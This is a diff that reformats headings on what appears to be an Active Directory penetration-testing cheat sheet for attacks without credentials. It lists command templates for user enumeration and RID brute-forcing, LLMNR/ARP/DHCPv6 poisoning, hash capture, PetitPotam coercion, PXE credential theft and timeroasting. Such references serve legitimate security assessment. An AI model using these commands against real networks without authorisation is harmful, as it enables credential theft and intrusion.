@@ -2,7 +2,8 @@
 title: "No Credentials"
 description: "No Credentials techniques and commands for Active Directory security assessment."
 ---
-## Scan network >>> Vulnerable host
+# No Credentials
+## Scan network *Vulnerable host*{: .highlight}
 - `nxc smb <ip_range>`
 - `nmap -sP -p <ip>`
 - `nmap -Pn -sV --top-ports 50 --open <ip>`
@@ -25,20 +26,20 @@ description: "No Credentials techniques and commands for Active Directory securi
 - `enum4linux-ng.py -a -u '' -p '' <ip>`
 - `smbclient -U '%' -L //<ip>`
 
-## Enumerate LDAP >>> Username
+## Enumerate LDAP *Username*{: .highlight}
 - `nmap -n -sV --script 'ldap*' and not brute -p 389 <dc_ip>`
 - `ldapsearch -x -H <dc_ip> -s base`
 
-## Enumerate Users >>> Username
+## Enumerate Users *Username*{: .highlight}
 - `nxc smb <dc_ip> --users`
 - `nxc smb <dc_ip> --rid-brute 10000 # bruteforcing RID`
 - `net rpc group members 'Domain Users' -W '<domain> -l <ip> -U '%'`
 
-## Bruteforce users >>> Username
+## Bruteforce users *Username*{: .highlight}
 - `kerbrute userenum -d <domain> <userlist>`
 - `nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm= '<domain>',userdb=<user_list_file>" <dc_ip>`
 
-## Poisoning >>> poisoning SMB || poisoning LDAP || poisoning HTTP
+## Poisoning *poisoning SMB || poisoning LDAP || poisoning HTTP*{: .highlight}
 - LLMNR / NBTNS / MDNS
   - `responder -l <interface>`
 - ⚠️ DHCPv6 (IPv6 prefered to IPv4)
@@ -47,19 +48,19 @@ description: "No Credentials techniques and commands for Active Directory securi
 - ⚠️ ARP Poisoning
   - `bettercap`
   - `asreqroast`
-    - `Pcredz -i <interface> -v` >>> Hash found ASREQ
+    - `Pcredz -i <interface> -v` *Hash found ASREQ*{: .highlight}
 
-## Coerce >>> Coerce SMB
+## Coerce *Coerce SMB*{: .highlight}
 - Unauthenticated PetitPotam (CVE-2022-26925) @CVE@
   - `petitpotam.py -d <domain> <listener> <target>`
 
 ## PXE
-- no password >>> Credentials (NAA account)
+- no password *Credentials (NAA account)*{: .highlight}
   - `pxethief.py 1`
   - `pxethief.py 2 <distribution_point_ip>`
-- password protected >>> PXE Hash
+- password protected *PXE Hash*{: .highlight}
   - `tftp -i <dp_ip> GET "\xxx\boot.var"`
   - `pxethief.py 5 '\xxx\boot.var'`
 
-## TimeRoasting >>> timeroast hash
+## TimeRoasting *timeroast hash*{: .highlight}
 - `timeroast.py <dc_ip> -o <output_log>`
